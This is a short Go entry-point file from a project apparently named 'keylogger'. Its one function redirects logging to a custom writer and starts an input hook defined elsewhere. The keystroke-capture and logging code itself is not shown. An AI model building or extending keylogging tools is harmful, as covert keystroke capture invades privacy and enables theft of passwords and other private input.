package entry

import (
	"keylogger/pkg/hook"
	"keylogger/utils"
	"log"
)

func runCLI() {
	log.SetOutput(utils.LogWriter())
	hook.InitHook()
}
